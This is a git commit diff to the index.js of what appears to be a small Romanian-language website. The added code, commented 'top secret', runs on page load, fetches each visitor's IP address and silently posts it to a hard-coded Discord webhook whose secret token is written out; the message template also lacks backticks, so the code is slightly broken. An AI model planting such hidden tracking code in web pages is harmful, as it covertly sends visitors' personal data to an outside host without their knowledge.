6b0b5ab8b102efe7c0998c1f41a8d052cbdb06e6
Matei <116720757+MateiReed@users.noreply.github.com>
2024-02-21 20:57:20 +0200

    Add files via upload

--- index.js
+++ index.js
@@ -54,7 +54,48 @@ function alertNotification() {
   alert("Nu ai privilegii de admin!")
 }
 
+
 document.getElementById("signup-btn").addEventListener("click", function(){
   window.location.href = "signup.html";
 });
 
+//top secret maneeee
+
+function getUserIP(callback) {
+  fetch('https://api.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => {
+      const ipAddress = data.ip;
+      callback(ipAddress);
+    })
+    .catch(error => console.error('Error fetching IP address:', error));
+}
+
+// Function to send IP address to Discord webhook
+function sendIPToDiscord(ipAddress) {
+  const webhookURL = 'https://discord.com/api/webhooks/1209935096396906497/37hvz1ZLG9wXploBd0dQL9NjQtKmOzxizFqkMW5p9cEAdCHHpcQyjOwXUL01_-trHP2u';
+
+  // Create the payload
+  const payload = {
+    content: New visitors IP address: ${ipAddress}
+  };
+
+  // Send POST request to Discord webhook URL
+  fetch(webhookURL, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify(payload)
+  })
+  .then(response => {
+    if (!response.ok) {
+      throw new Error('Failed to send lumea de minecraft to Discord webhook');
+    }
+    console.log('IP address sent to Discord successfully');
+  })
+  .catch(error => console.error('Tzakalie s a dus pe cioaca TOTU...EROARE 69:', error));
+}
+
+// Call the functions
+getUserIP(sendIPToDiscord);
